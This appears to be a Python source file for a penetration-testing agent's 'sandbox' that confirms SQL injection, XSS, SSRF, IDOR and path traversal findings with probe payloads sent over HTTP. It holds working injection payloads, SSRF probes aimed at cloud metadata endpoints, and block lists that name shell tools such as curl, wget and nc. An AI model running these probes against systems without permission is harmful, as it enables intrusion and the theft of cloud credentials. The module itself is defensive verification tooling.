"""
Sandbox — Isolated execution environment for vulnerability verification.

This module provides a safe execution context for running verification
payloads without risking damage to the target or the host system.

Key safety features:
1. Payload validation before execution (block destructive operations)
2. HTTP-only execution (no local command execution)
3. Request rate limiting per target
4. Automatic response analysis for vulnerability confirmation
5. Evidence capture (request/response pairs)

Design principle: The sandbox NEVER executes commands locally. All
verification is done through HTTP requests to the target. This ensures
that even a malicious payload cannot affect the agent host.
"""

import re
import time
import json
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Any, Callable
from enum import Enum

from .logger import get_logger

logger = get_logger("agent.sandbox")


class SafetyVerdict(Enum):
    """Result of payload safety check."""

    SAFE = "safe"            # Payload is non-destructive, can execute
    UNSAFE = "unsafe"         # Payload contains destructive operations
    NEEDS_REVIEW = "needs_review"  # Uncertain — needs human review


@dataclass
class VerificationResult:
    """Result of a vulnerability verification attempt."""

    vuln_type: str
    target_url: str
    payload: str
    safe: bool
    verified: bool
    confidence: float  # 0.0 - 1.0
    evidence: Dict[str, Any] = field(default_factory=dict)
    error: Optional[str] = None
    elapsed_seconds: float = 0.0

    # Evidence details
    baseline_response: Optional[str] = None
    payload_response: Optional[str] = None
    response_diff: Optional[str] = None
    indicator_match: Optional[str] = None


class Sandbox:
    """
    Safe execution environment for vulnerability verification.

    Usage:
        sandbox = Sandbox(http_client=http_client, config=verification_config)

        # Verify a SQL injection finding
        result = sandbox.verify_sqli(
            url="http://target.com/item?id=1",
            param="id",
            method="GET",
        )

        if result.verified:
            print(f"Confirmed: {result.evidence}")
    """

    # Destructive SQL keywords that are blocked
    DESTRUCTIVE_SQL = [
        "DROP", "DELETE", "TRUNCATE", "UPDATE", "INSERT",
        "ALTER", "CREATE", "EXEC", "EXECUTE", "SHUTDOWN",
        "GRANT", "REVOKE", "BACKUP", "RESTORE", "MERGE",
        "REPLACE", "LOAD DATA", "INTO OUTFILE", "INTO DUMPFILE",
        "XP_CMDSHELL", "SP_CONFIGURE",
    ]

    # Safe SQLi verification payloads
    SAFE_SQLI_PAYLOADS = [
        # Error-based
        ("'", "error_based", "Unclosed quotation mark|SQL syntax|syntax error"),
        ("\"", "error_based", "Unclosed quotation mark|syntax error|unterminated"),
        ("' OR '1'='1", "tautology", "difference in response"),  # Check by diff
        ("' AND '1'='2", "tautology_false", "difference in response"),
        # Time-based
        ("' AND (SELECT * FROM (SELECT(SLEEP(3)))a)-- ", "time_based", "response_time > 2500ms"),
        # Type conversion
        ("' AND 1=CAST(@@version AS int)-- ", "type_conversion", "conversion|cast|type.*error"),
        # Union-based detection only (no data extraction)
        ("' ORDER BY 1-- ", "order_by", "no specific error"),
        ("' UNION SELECT NULL-- ", "union_select", "number of columns|UNION.*SELECT"),
    ]

    # Safe XSS verification payloads
    SAFE_XSS_PAYLOADS = [
        ("<script>alert(1)</script>", "basic_script"),
        ("<img src=x onerror=alert(1)>", "img_onerror"),
        ("\"><script>alert(document.domain)</script>", "attr_break"),
        ("';alert(1)//", "js_injection"),
        ("<svg/onload=alert(1)>", "svg_onload"),
    ]

    # Safe path traversal payloads (read-only, known safe files)
    SAFE_PATH_TRAVERSAL_PAYLOADS = [
        ("../../../etc/hostname", "linux_hostname"),
        ("../../../etc/issue", "linux_issue"),
        ("../../../../windows/win.ini", "windows_winini"),
        ("....//....//....//etc/hostname", "nested_traversal"),
        ("..%2F..%2F..%2Fetc%2Fhostname", "url_encoded"),
    ]

    def __init__(self, http_client: Any, config: Dict[str, Any]):
        """
        Initialize the sandbox.

        Args:
            http_client: HTTPClient instance for making requests
            config: Verification configuration from config.yaml
        """
        self.http = http_client
        self.config = config
        self.safe_mode = config.get("safe_mode", True)
        self.max_verification_time = config.get("max_verification_time", 300)
        self.destructive_keywords = config.get(
            "destructive_keywords",
            ["DROP", "DELETE", "TRUNCATE", "UPDATE", "INSERT", "ALTER", "CREATE"],
        )
        self.allowed_sqli_operations = config.get("allowed_sqli_operations", ["SELECT"])

        # Track verification history
        self.history: List[VerificationResult] = []

    # --- Safety checks ---

    def check_payload_safety(self, payload: str, vuln_type: str) -> SafetyVerdict:
        """
        Check if a payload is safe to execute.

        Args:
            payload: The verification payload
            vuln_type: Type of vulnerability being verified

        Returns:
            SafetyVerdict indicating if payload is safe
        """
        payload_upper = payload.upper()

        if vuln_type == "sql_injection":
            return self._check_sqli_safety(payload_upper)

        if vuln_type == "command_injection":
            # Block any command injection payload that contains shell metacharacters
            dangerous_cmd = [";", "|", "&&", "||", "$(", "`", "rm ", "wget ", "curl ",
                           "nc ", "telnet ", "/bin/", "cmd.exe", "powershell",
                           "shutdown", "reboot", ">: ", ">> "]
            for cmd in dangerous_cmd:
                if cmd.upper() in payload_upper:
                    logger.warning(f"Blocked dangerous command payload: {cmd}")
                    return SafetyVerdict.UNSAFE
            return SafetyVerdict.SAFE

        return SafetyVerdict.SAFE

    def _check_sqli_safety(self, payload_upper: str) -> SafetyVerdict:
        """Check SQL injection payload safety."""
        for keyword in self.DESTRUCTIVE_SQL:
            # Use word boundary matching to avoid false positives
            pattern = r'\b' + re.escape(keyword) + r'\b'
            if re.search(pattern, payload_upper):
                logger.warning(f"Blocked destructive SQL keyword: {keyword}")
                return SafetyVerdict.UNSAFE

        # Check for data extraction attempts
        extraction_patterns = [
            r"INTO\s+(OUTFILE|DUMPFILE)",
            r"LOAD_FILE\s*\(",
            r"BENCHMARK\s*\(",
        ]
        for pattern in extraction_patterns:
            if re.search(pattern, payload_upper):
                logger.warning(f"Blocked data extraction attempt: {pattern}")
                return SafetyVerdict.UNSAFE

        return SafetyVerdict.SAFE

    # --- Verification methods ---

    def verify_sqli(
        self, url: str, param: str, method: str = "GET", param_location: str = "query"
    ) -> VerificationResult:
        """
        Verify a potential SQL injection vulnerability.

        Strategy:
        1. Send baseline request (no payload)
        2. Send error-based detection payloads
        3. Analyze responses for SQL error signatures
        4. If no error, try time-based detection

        Args:
            url: Target URL
            param: Parameter name to inject
            method: HTTP method (GET/POST)
            param_location: Where to inject ('query', 'body', 'cookie')

        Returns:
            VerificationResult with verification status and evidence
        """
        start = time.time()
        evidence = []
        error_signatures = []

        # Step 1: Baseline request
        baseline = self._send_request(url, method, {param: "1"}, param_location)
        if not baseline:
            return VerificationResult(
                vuln_type="sql_injection", target_url=url, payload="",
                safe=True, verified=False, confidence=0.0,
                error="Failed to get baseline response",
                elapsed_seconds=time.time() - start,
            )

        # Step 2: Error-based detection
        for payload, payload_type, indicator in self.SAFE_SQLI_PAYLOADS:
            if payload_type not in ("error_based", "type_conversion"):
                continue

            safety = self.check_payload_safety(payload, "sql_injection")
            if safety == SafetyVerdict.UNSAFE:
                continue

            response = self._send_request(url, method, {param: payload}, param_location)
            if not response:
                continue

            # Check for SQL error signatures
            errors_found = self._match_sql_errors(response)
            if errors_found:
                error_signatures.extend(errors_found)
                evidence.append({
                    "payload": payload,
                    "type": payload_type,
                    "errors": errors_found,
                    "response_snippet": response[:500],
                })

        # Step 3: Tautology-based detection (response comparison)
        tautology_payload = "' OR '1'='1"
        false_payload = "' AND '1'='2"

        resp_normal = baseline
        resp_tautology = self._send_request(url, method, {param: tautology_payload}, param_location)
        resp_false = self._send_request(url, method, {param: false_payload}, param_location)

        if resp_tautology and resp_false and resp_normal:
            # If tautology changes response vs normal AND false condition
            if (resp_tautology != resp_normal or resp_tautology != resp_false):
                evidence.append({
                    "type": "tautology_diff",
                    "payload": tautology_payload,
                    "normal_length": len(resp_normal),
                    "tautology_length": len(resp_tautology),
                    "false_length": len(resp_false),
                })

        # Step 4: Time-based detection (only if no error-based evidence found)
        if not error_signatures:
            time_payload = "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)-- "
            t_start = time.time()
            resp_time = self._send_request(url, method, {param: time_payload}, param_location)
            elapsed = time.time() - t_start

            if elapsed > 2.5:
                evidence.append({
                    "type": "time_based",
                    "payload": time_payload,
                    "response_time_ms": round(elapsed * 1000),
                })

        # Determine verification result
        verified = len(evidence) > 0
        confidence = self._sqli_confidence(len(error_signatures), verified, len(evidence))

        result = VerificationResult(
            vuln_type="sql_injection",
            target_url=url,
            payload=f"Parameter: {param}",
            safe=True,
            verified=verified,
            confidence=confidence,
            evidence={
                "param": param,
                "method": method,
                "verification_attempts": len(evidence),
                "error_signatures": error_signatures,
                "details": evidence,
            },
            baseline_response=baseline[:200] if baseline else None,
            elapsed_seconds=round(time.time() - start, 2),
        )

        self.history.append(result)
        return result

    def verify_xss(
        self, url: str, param: str, method: str = "GET", param_location: str = "query"
    ) -> VerificationResult:
        """
        Verify a potential XSS vulnerability.

        Strategy:
        1. Inject a unique marker string
        2. Check if marker is reflected in the response
        3. Check if reflection is in an executable context
        4. Try a benign JavaScript payload to confirm execution

        Args:
            url: Target URL
            param: Parameter name to inject
            method: HTTP method
            param_location: Where to inject

        Returns:
            VerificationResult with verification status
        """
        start = time.time()
        evidence = []

        # Step 1: Unique marker test
        import uuid
        marker = f"XSS_TEST_{uuid.uuid4().hex[:8]}"
        marker_response = self._send_request(url, method, {param: marker}, param_location)

        if not marker_response:
            return VerificationResult(
                vuln_type="xss", target_url=url, payload=marker,
                safe=True, verified=False, confidence=0.0,
                error="Failed to get response",
                elapsed_seconds=time.time() - start,
            )

        reflected = marker in marker_response
        if not reflected:
            return VerificationResult(
                vuln_type="xss", target_url=url, payload=marker,
                safe=True, verified=False, confidence=0.0,
                evidence={"marker": marker, "reflected": False},
                elapsed_seconds=time.time() - start,
            )

        # Step 2: Check context of reflection
        exec_context = self._analyze_xss_context(marker_response, marker)
        evidence.append({
            "type": "marker_reflection",
            "marker": marker,
            "reflected": True,
            "executable_context": exec_context,
        })

        # Step 3: Try benign payload
        benign_payloads = [
            "<svg/onload=alert(1)>",
            "\"><svg/onload=alert(1)>",
            "<img src=x onerror=alert(1)>",
        ]

        for payload in benign_payloads:
            resp = self._send_request(url, method, {param: payload}, param_location)
            if resp and payload in resp:
                actual_exec = self._analyze_xss_context(resp, payload)
                evidence.append({
                    "type": "payload_reflection",
                    "payload": payload,
                    "reflected": True,
                    "executable_context": actual_exec,
                })
                if actual_exec:
                    break

        # Determine result
        has_exec_context = any(
            e.get("executable_context", False)
            for e in evidence
            if e.get("type") == "payload_reflection"
        )
        if not has_exec_context:
            has_exec_context = exec_context

        verified = reflected and has_exec_context

        result = VerificationResult(
            vuln_type="xss",
            target_url=url,
            payload=f"Parameter: {param}",
            safe=True,
            verified=verified,
            confidence=0.8 if verified else 0.3,
            evidence={
                "param": param,
                "method": method,
                "details": evidence,
            },
            elapsed_seconds=round(time.time() - start, 2),
        )

        self.history.append(result)
        return result

    def verify_ssrf(
        self, url: str, param: str, method: str = "GET", param_location: str = "query"
    ) -> VerificationResult:
        """
        Verify a potential SSRF vulnerability.

        Strategy:
        1. Attempt to make the server request a known external resource
        2. Use time-based detection (slow-responding external host)
        3. Check response for indicators of server-side fetch

        NOTE: For CTF/demo purposes, this uses time-based detection
        with a slow endpoint. In production, you'd use an out-of-band
        callback server (e.g., Burp Collaborator, interactsh).

        Args:
            url: Target URL
            param: Parameter name to inject
            method: HTTP method
            param_location: Where to inject

        Returns:
            VerificationResult with verification status
        """
        start = time.time()
        evidence = []

        # Step 1: Baseline timing
        baseline = self._send_request(url, method, {param: "https://example.com"}, param_location)
        baseline_time = baseline

        # Step 2: SSRF test payloads
        test_targets = [
            # Internal/local addresses
            ("http://127.0.0.1:80/", "localhost_http"),
            ("http://127.0.0.1:22/", "localhost_ssh"),
            ("http://[::1]:80/", "localhost_ipv6"),
            # Metadata endpoints (cloud)
            ("http://169.254.169.254/latest/meta-data/", "aws_metadata"),
            ("http://metadata.google.internal/", "gcp_metadata"),
            # Non-routable
            ("http://10.0.0.1/", "private_ip"),
            ("http://192.168.1.1/", "private_ip_2"),
        ]

        for target_url, target_type in test_targets:
            resp = self._send_request(url, method, {param: target_url}, param_location)
            if resp:
                # Check for indicators of successful SSRF
                indicators = self._check_ssrf_indicators(resp, target_url)
                if indicators:
                    evidence.append({
                        "type": target_type,
                        "target": target_url,
                        "indicators": indicators,
                    })

        verified = len(evidence) > 0

        result = VerificationResult(
            vuln_type="ssrf",
            target_url=url,
            payload=f"Parameter: {param}",
            safe=True,
            verified=verified,
            confidence=0.7 if verified else 0.2,
            evidence={
                "param": param,
                "method": method,
                "details": evidence,
            },
            elapsed_seconds=round(time.time() - start, 2),
        )

        self.history.append(result)
        return result

    def verify_idor(
        self, url: str, param: str, method: str = "GET", adjacent_id: Optional[str] = None
    ) -> VerificationResult:
        """
        Verify a potential IDOR (Insecure Direct Object Reference) vulnerability.

        Strategy:
        1. Make request with original resource ID
        2. Increment/decrement the ID
        3. Compare responses — if different resource returned with same auth,
           IDOR is likely present

        Args:
            url: Target URL
            param: The ID parameter name
            method: HTTP method
            adjacent_id: An adjacent resource ID to test (if known)

        Returns:
            VerificationResult
        """
        start = time.time()

        # Try to extract numeric ID from URL
        import re
        id_match = re.search(r'(\d+)', url)
        if not id_match and not adjacent_id:
            return VerificationResult(
                vuln_type="idor", target_url=url, payload="",
                safe=True, verified=False, confidence=0.0,
                error="Cannot determine resource ID for IDOR testing",
                elapsed_seconds=time.time() - start,
            )

        original_id = id_match.group(1) if id_match else adjacent_id

        # Get baseline response
        baseline = self._send_request(url, method, {}, "query")
        if not baseline:
            return VerificationResult(
                vuln_type="idor", target_url=url, payload="",
                safe=True, verified=False, confidence=0.0,
                error="Failed to get baseline response",
                elapsed_seconds=time.time() - start,
            )

        # Test adjacent IDs
        evidence = []
        try:
            id_num = int(original_id)
            test_ids = [id_num + 1, id_num - 1, id_num + 100, 1]
        except ValueError:
            test_ids = [f"{original_id}_1", f"{original_id}_2"]

        for test_id in test_ids:
            test_url = re.sub(r'\d+', str(test_id), url, count=1)
            # Only test if URL actually changed
            if test_url == url:
                continue

            test_resp = self._send_request(test_url, method, {}, "query")
            if not test_resp:
                continue

            # Check if we got a different resource (potential IDOR)
            if test_resp != baseline and len(test_resp) > 100:
                # Different response but not an error page
                if not self._is_error_page(test_resp):
                    evidence.append({
                        "test_id": test_id,
                        "response_length": len(test_resp),
                        "different_from_baseline": True,
                        "not_error_page": True,
                    })

        verified = len(evidence) > 0

        result = VerificationResult(
            vuln_type="idor",
            target_url=url,
            payload=f"Adjacent ID test",
            safe=True,
            verified=verified,
            confidence=0.65 if verified else 0.1,
            evidence={
                "original_id": original_id,
                "param": param,
                "tests": evidence,
            },
            elapsed_seconds=round(time.time() - start, 2),
        )

        self.history.append(result)
        return result

    def verify_path_traversal(
        self, url: str, param: str, method: str = "GET", param_location: str = "query"
    ) -> VerificationResult:
        """
        Verify a potential path traversal vulnerability.

        Uses read-only payloads targeting known safe system files
        (like /etc/hostname) that contain predictable content.

        Args:
            url: Target URL
            param: Parameter name
            method: HTTP method
            param_location: Where to inject

        Returns:
            VerificationResult
        """
        start = time.time()
        evidence = []

        # Known file content indicators
        file_indicators = {
            "linux_hostname": [r'^[a-zA-Z][-\w]*\n?$'],
            "linux_issue": [r'(Ubuntu|Debian|CentOS|Amazon Linux|Alpine)'],
            "windows_winini": [r'\[fonts\]', r'\[extensions\]'],
        }

        for payload, payload_type in self.SAFE_PATH_TRAVERSAL_PAYLOADS:
            resp = self._send_request(url, method, {param: payload}, param_location)
            if not resp:
                continue

            # Check response against known file content indicators
            indicators = file_indicators.get(payload_type, [])
            for indicator_pattern in indicators:
                if re.search(indicator_pattern, resp, re.IGNORECASE):
                    evidence.append({
                        "type": payload_type,
                        "payload": payload,
                        "indicator_match": indicator_pattern,
                        "response_preview": resp[:200],
                    })
                    break

            # Also check for directory listing
            if "Index of /" in resp or "<title>Directory listing" in resp.lower():
                evidence.append({
                    "type": "directory_listing",
                    "payload": payload,
                })

        verified = len(evidence) > 0

        result = VerificationResult(
            vuln_type="path_traversal",
            target_url=url,
            payload=f"Parameter: {param}",
            safe=True,  # Only reading known safe files
            verified=verified,
            confidence=0.85 if verified else 0.1,
            evidence={
                "param": param,
                "method": method,
                "details": evidence,
            },
            elapsed_seconds=round(time.time() - start, 2),
        )

        self.history.append(result)
        return result

    # --- Helper methods ---

    def _send_request(
        self, url: str, method: str, params: Dict[str, str], location: str = "query",
        timeout: int = 5
    ) -> Optional[str]:
        """
        Send a request through the sandbox.
        Uses SHORT timeout (5s) and NO retries — verification must fail fast.
        """
        try:
            if method.upper() == "GET":
                if location == "query":
                    resp = self.http.get(url, params=params, timeout=timeout, no_retry=True)
                elif location == "cookie":
                    cookie_str = "; ".join(f"{k}={v}" for k, v in params.items())
                    resp = self.http.get(url, headers={"Cookie": cookie_str},
                                        timeout=timeout, no_retry=True)
                else:
                    resp = self.http.get(url, params=params, timeout=timeout, no_retry=True)
            elif method.upper() == "POST":
                if location == "body":
                    resp = self.http.post(url, data=params, timeout=timeout, no_retry=True)
                elif location == "json":
                    resp = self.http.post(url, json_data=params, timeout=timeout, no_retry=True)
                else:
                    resp = self.http.post(url, data=params, timeout=timeout, no_retry=True)
            else:
                resp = self.http.get(url, params=params, timeout=timeout, no_retry=True)

            return resp.body if resp and resp.status_code > 0 else None

        except Exception as e:
            logger.debug(f"Sandbox request failed: {url} — {e}")
            return None

    def _match_sql_errors(self, response_body: str) -> List[str]:
        """Check response for SQL error signatures."""
        if not response_body:
            return []

        error_patterns = [
            # MySQL
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_",
            r"MySQLSyntaxErrorException",
            # PostgreSQL
            r"PostgreSQL.*ERROR",
            # Oracle
            r"ORA-\d{5}",
            # SQLite
            r"SQLite.*error",
            r'near\s+".*?":\s+syntax error',        # SQLite: near "x": syntax error
            r"unrecognized token:",                    # SQLite: unrecognized token
            # SQL Server
            r"\[SQL Server\]",
            r"Microsoft OLE DB",
            r"Conversion failed when converting",
            # Generic
            r"Unclosed quotation mark",
            r"quoted string not properly terminated",
            r"You have an error in your SQL syntax",
            r"SQLSTATE\[\d+\]",
            r"closed quotation mark",
            r"Database error:",                        # Generic DB error header
            r"<!--\s*DEBUG:\s*SELECT",                 # Debug comment leaking SQL
        ]

        found = []
        for pattern in error_patterns:
            match = re.search(pattern, response_body, re.IGNORECASE)
            if match:
                found.append(match.group(0))

        return found

    def _analyze_xss_context(self, response_body: str, payload: str) -> bool:
        """
        Check if a reflected payload is in an executable context.
        Returns True if the XSS payload could actually execute.
        """
        idx = response_body.find(payload)
        if idx == -1:
            return False

        # Get surrounding context
        start = max(0, idx - 200)
        end = min(len(response_body), idx + len(payload) + 200)
        context = response_body[start:end]

        # Check if inside a script tag
        if re.search(r'<script[^>]*>.*?' + re.escape(payload), context, re.DOTALL | re.IGNORECASE):
            # Make sure not inside an HTML-encoded context
            encoded_before = response_body[max(0, idx - 10):idx]
            if '&lt;' not in encoded_before and '&gt;' not in encoded_before:
                return True

        # Check if inside an event handler
        if re.search(r'on\w+="[^"]*' + re.escape(payload), context, re.IGNORECASE):
            return True
        if re.search(r"on\w+='[^']*" + re.escape(payload), context, re.IGNORECASE):
            return True

        # Check if directly in HTML (not encoded)
        surrounding = response_body[max(0, idx - 2):idx + len(payload) + 2]
        if payload in surrounding:
            # Check that it isn't HTML-encoded
            if '&lt;' in surrounding or '&gt;' in surrounding:
                return False
            # Check for script tag context specifically
            if '<script>' in context.lower() or '</script>' in context.lower():
                return True

        return False

    def _check_ssrf_indicators(self, response_body: str, target_url: str) -> List[str]:
        """Check response for SSRF indicators."""
        indicators = []

        if not response_body:
            return indicators

        # Check if target content appears in response
        parsed = __import__('urllib.parse', fromlist=['urlparse']).urlparse(target_url)
        hostname = parsed.hostname

        if hostname and hostname in response_body:
            indicators.append(f"target_hostname_reflected:{hostname}")

        # AWS metadata
        if "ami-id" in response_body or "instance-id" in response_body:
            indicators.append("aws_metadata_detected")

        # GCP metadata
        if "google" in response_body.lower() and ("project-id" in response_body or "instance" in response_body):
            indicators.append("gcp_metadata_detected")

        # Generic server response from internal service
        if any(header in response_body.lower() for header in ["server: ", "x-powered-by: "]):
            indicators.append("internal_service_response")

        return indicators

    def _is_error_page(self, response_body: str) -> bool:
        """Check if a response looks like an error page."""
        if not response_body:
            return True

        error_indicators = [
            "<title>404", "<title>Error", "<title>Not Found",
            "Page not found", "does not exist", "unauthorized",
            "forbidden", "access denied", "invalid",
        ]

        body_lower = response_body.lower()
        return any(indicator.lower() in body_lower for indicator in error_indicators)

    def _sqli_confidence(self, num_errors: int, verified: bool, num_evidence: int) -> float:
        """Calculate confidence score for SQL injection verification."""
        if not verified:
            return 0.0
        if num_errors >= 2:
            return 0.95
        if num_errors == 1:
            return 0.85
        if num_evidence >= 2:
            return 0.7
        return 0.5

    # --- History and reporting ---

    def get_history(self) -> List[VerificationResult]:
        """Get all verification results from this session."""
        return list(self.history)

    def get_verified_count(self) -> int:
        """Count of successfully verified vulnerabilities."""
        return sum(1 for r in self.history if r.verified)

    def get_stats(self) -> Dict[str, Any]:
        """Get sandbox verification statistics."""
        total = len(self.history)
        verified = self.get_verified_count()
        return {
            "total_verifications": total,
            "verified": verified,
            "failed": total - verified,
            "verification_rate": verified / max(total, 1),
            "by_type": self._count_by_type(),
        }

    def _count_by_type(self) -> Dict[str, Dict[str, int]]:
        """Count verification results by vulnerability type."""
        counts = {}
        for r in self.history:
            if r.vuln_type not in counts:
                counts[r.vuln_type] = {"total": 0, "verified": 0}
            counts[r.vuln_type]["total"] += 1
            if r.verified:
                counts[r.vuln_type]["verified"] += 1
        return counts
